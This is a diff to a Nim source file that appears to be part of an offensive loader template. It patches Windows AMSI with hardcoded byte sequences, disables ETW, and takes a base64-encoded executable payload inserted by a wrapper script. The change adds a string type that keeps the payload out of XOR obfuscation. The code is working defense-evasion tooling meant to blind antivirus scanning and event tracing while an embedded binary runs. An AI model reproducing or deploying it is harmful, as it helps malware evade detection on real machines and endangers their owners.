@@ -27,6 +27,10 @@ import base64
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
 #[ PLACEHOLDERVERBOSE ]#
 
+# Define a distinct string type for the payload (which will not be XOR'd)
+type noCryptString = string
+
+# Get the AMSI patch bytes based on arch
 when defined amd64:
     if verbose:
         echo "[*] Running in x64 process"
@@ -36,6 +40,7 @@ elif defined i386:
         echo "[*] Running in x86 process"
     const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
+# Patch AMSI
 proc PatchAmsi(): bool =
     var
         amsi: LibHandle
@@ -91,7 +96,7 @@ when isMainModule:
         if verbose:
             echo fmt"[*] ETW disabled: {bool(success)}"
 
-    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let b64buf = "TVqQAAMAAAAEAA=="
+    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let b64buf : noCryptString = "TVqQAAMAAAAEAA=="
     #[ PLACEHOLDERBENCBIN ]#
 
     ## Converts a string to the corresponding byte sequence.
